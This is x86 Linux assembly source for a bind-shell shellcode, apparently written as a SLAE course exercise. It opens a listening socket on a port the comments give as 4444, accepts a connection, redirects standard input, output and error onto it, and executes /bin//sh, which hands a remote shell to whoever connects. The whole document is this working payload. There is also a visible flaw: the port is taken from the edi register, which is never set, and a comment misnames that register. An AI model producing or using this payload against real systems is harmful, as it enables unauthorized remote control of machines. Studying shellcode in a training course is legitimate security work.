global _start

section .text

_start:


    ;Resetting the registers
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    xor esi, esi

    ;Setting the parameters for the socket-function
    push eax                    ;Third parameter(INADDR_ANY=0)
    push 1                      ;Second parameter(SOCKSTREAM=1)
    push 2                      ;First parameter(AF_INET=2)

    ;Syscall of socket
    mov al,0x66
    mov bl,1
    mov ecx, esp
    int 0x80
    mov esi, eax    ;Save the server_socket in varible socket_server

    ;Preparation for bind

    xor eax, eax                ;Reset eax
    push eax                    ;server.sin_addr.s_addr=0; ;4 Byte
    mov eax, edi                ;Get the Port-Number from esi (2 Byte).
    xchg ah,al                  ;Changing ah and al(Big endian)
    push ax                     ;server.sin_port=htons(4444);
    push  word  0x2             ;server.sin_family=2;
    mov edi, esp                ;Save the adress of the structure in edi
    push dword 0x10             ;Third parameter of bind-call
    push edi                    ;Second parameter of bind-call
    push dword esi  ;First paramter of bind-call
    mov ecx, esp                ;esp references to the begin of server

    ; Syscall bind
    xor eax, eax
    mov al, 0x66
    mov bl,2
    int 0x80

    ; Preparation for Listen
    push 2;                     ;Second parameter of listen-call(2)
    push dword esi  ;First paramter of listen-call(server_socket)

    ; Syscall listen
    xor eax,eax
    mov al, 0x66
    mov bl,4
    mov ecx, esp
    int 0x80

    ;Preparation for accept
    xor ecx, ecx
    push ecx                        ;Due to the manpage of accept(man 2 accept) I fill both parameters of the accept-syscall with 0.
    push ecx
    push dword esi                  ;First parameter

    ; Syscall accept
    xor eax, eax
    mov al, 0x66
    mov bl,5
    mov ecx, esp
    int 0x80

    ;Preparation for dup2
    mov ebx, eax                    ;Save the result  of last syscall in ebx. ebx ist also the first parameter of dup2-syscall
    xor ecx, ecx                    ;Reset ecx
    mov cl,2                        ;cl is is counter and also the second paramter of dup2-syscall

    dup2_loop:
        xor eax, eax
        mov al, 0x3F            ;0x3f is syscall-number of dup2
        int 0x80
        dec ecx                 ;decrement ecx by one
        jns dup2_loop           ;if ecx=>0 then loop

    ;this is the code from execve_stack.asm from the SLAE-course
    xor eax, eax
    push eax
    push 0x68732f2f
	push 0x6e69622f
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 11
    int 0x80
